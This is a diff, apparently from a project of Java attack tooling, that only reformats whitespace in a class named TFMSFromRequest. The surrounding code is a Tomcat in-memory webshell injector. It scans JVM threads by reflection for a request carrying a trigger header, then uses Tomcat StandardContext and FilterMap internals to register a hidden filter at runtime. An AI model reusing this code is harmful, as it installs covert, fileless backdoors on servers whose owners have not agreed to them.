@@ -40,7 +40,7 @@ public class TFMSFromRequest implements Filter {
 
     public static void getRequestAndResponse() {
         try {
-            boolean  flag    = false;
+            boolean flag = false;
             Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
 
             for (int i = 0; i < threads.length; ++i) {
@@ -61,7 +61,7 @@ public class TFMSFromRequest implements Filter {
                             for (int j = 0; j < processors.size(); ++j) {
                                 Object processor = processors.get(j);
                                 target = getFieldValue(processor, "req");
-                                Object req   = target.getClass().getMethod("getNote", Integer.TYPE).invoke(target, new Integer(1));
+                                Object req = target.getClass().getMethod("getNote", Integer.TYPE).invoke(target, new Integer(1));
                                 String value = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, new String(HEADER_KEY));
                                 if (value != null && value.contains(HEADER_VALUE)) {
                                     request = (HttpServletRequest) req;
@@ -110,12 +110,12 @@ public class TFMSFromRequest implements Filter {
 
     public static void addFilter() {
         ServletContext servletContext = request.getServletContext();
-        Filter         filter         = new TFMSFromRequest();
-        String         filterName     = NAME;
-        String         url            = pattern;
+        Filter filter = new TFMSFromRequest();
+        String filterName = NAME;
+        String url = pattern;
         if (servletContext.getFilterRegistration(filterName) == null) {
-            StandardContext            standardContext    = null;
-            Field                      stateField         = null;
+            StandardContext standardContext = null;
+            Field stateField = null;
             FilterRegistration.Dynamic filterRegistration = null;
 
             try {
@@ -137,8 +137,8 @@ public class TFMSFromRequest implements Filter {
                     filterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
                 }
 
-                Method   findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
-                Object[] filterMaps     = (Object[]) ((Object[]) ((Object[]) findFilterMaps.invoke(standardContext)));
+                Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
+                Object[] filterMaps = (Object[]) ((Object[]) ((Object[]) findFilterMaps.invoke(standardContext)));
 
                 for (int i = 0; i < filterMaps.length; ++i) {
                     Object filterMapObj = filterMaps[i];
